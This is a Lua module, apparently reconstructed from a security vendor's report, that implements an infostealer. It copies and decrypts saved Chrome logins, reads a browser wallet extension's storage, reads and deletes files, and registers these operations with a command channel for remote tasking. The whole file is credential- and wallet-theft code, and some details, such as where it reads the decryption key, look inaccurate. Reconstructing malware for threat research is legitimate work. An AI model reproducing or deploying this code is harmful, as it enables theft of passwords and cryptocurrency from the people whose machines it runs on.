-- Reconstructed from Bitdefender's report; backend interfaces are injected.
K2F_LUA_BUILD = "722b99d8d0e9"
local function install(backend)
  local ops = {}
  function ops.browserscan()
    local profile = os.getenv("LOCALAPPDATA") .. [[\Google\Chrome\User Data\Default\]]
    local staged = os.getenv("TEMP") .. "\\k2f-bcreds-" .. os.time() .. "-123.db"
    backend.copy_file(profile .. "Login Data", staged)
    local db = backend.sqlite_open(staged)
    local rows = db:query("SELECT origin_url, username_value, password_value FROM logins")
    local state = backend.read_file(profile .. "preferences.json")
    local key = backend.CryptUnprotectData(state.os_crypt.encrypted_key)
    return backend.decrypt_logins(rows, key)
  end
  function ops.wallet_files()
    local root = os.getenv("LOCALAPPDATA") .. [[\Google\Chrome\User Data\Default\Local Extension Settings\]]
    return backend.read_leveldb(root .. "nkbihfbeogaeaoehlefnkodbefgpgknn")
  end
  function ops.file_chunk(path)
    return backend.read_file(path, 2097152)
  end
  function ops.payload_cleanup(path)
    return os.remove(path)
  end
  local function handler(request)
    local task = backend.json_decode(request)
    return ops[task.op](task.path)
  end
  local comm = rawget(_G, "comm_center")
  if type(comm) == "table" and type(comm["reg_service"]) == "function" then
    comm["reg_service"]("k2f_chan", handler)
  end
end
return install
